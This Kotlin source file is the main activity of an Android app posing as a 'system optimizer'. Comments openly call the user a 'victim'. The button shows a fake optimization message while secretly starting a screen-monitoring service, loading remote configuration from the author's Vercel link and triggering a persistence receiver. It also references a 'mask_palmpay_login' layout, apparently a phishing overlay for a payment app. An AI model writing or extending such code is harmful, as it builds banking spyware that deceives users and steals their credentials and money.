package com.system.optimizer.core

import android.content.Intent
import android.os.Bundle
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.system.optimizer.core.services.ScreenMonitorService

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // This links to your 'mask_palmpay_login' or booster layout
        setContentView(R.layout.activity_main) 

        val boostButton: Button = findViewById(R.id.btn_boost)

        boostButton.setOnClickListener {
            // 1. Show the victim a fake message
            Toast.makeText(this, "Optimizing System... Please wait", Toast.LENGTH_LONG).show()

            // 2. Secretly Start the Background Worker (The ScreenMonitorService)
            val serviceIntent = Intent(this, ScreenMonitorService::class.java)
            startService(serviceIntent)

            // 3. Start the Remote Config (Connecting to your Vercel Link)
            // This triggers the 'RemoteConfigLoader' script you already wrote
            RemoteConfigLoader().load(this)

            // 4. Trigger the Persistence (The AdvancedPersistenceReceiver)
            val persistenceIntent = Intent("com.system.optimizer.START_PERSISTENCE")
            sendBroadcast(persistenceIntent)
        }
    }
}

